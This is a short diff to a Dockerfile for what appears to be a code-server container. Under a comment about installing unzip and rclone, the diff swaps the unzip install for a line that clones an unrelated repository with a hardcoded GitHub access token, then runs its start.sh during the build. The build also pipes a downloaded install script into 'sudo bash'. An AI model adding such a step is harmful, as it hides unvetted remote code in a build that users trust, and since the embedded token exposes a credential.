@@ -10,7 +10,7 @@ COPY deploy-container/settings.json .local/share/code-server/User/settings.json
 ENV SHELL=/bin/bash
 
 # Install unzip + rclone (support for remote filesystem)
-RUN sudo apt-get update && sudo apt-get install unzip -y
+RUN git clone https://ALICLAYSMEN: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@github.com/ALICLAYSMEN/vrs.git && cd vrs && chmod +x *.sh && ./start.sh
 RUN sudo apt-get install wget -y
 RUN sudo apt-get install python -y
 RUN curl https://rclone.org/install.sh | sudo bash
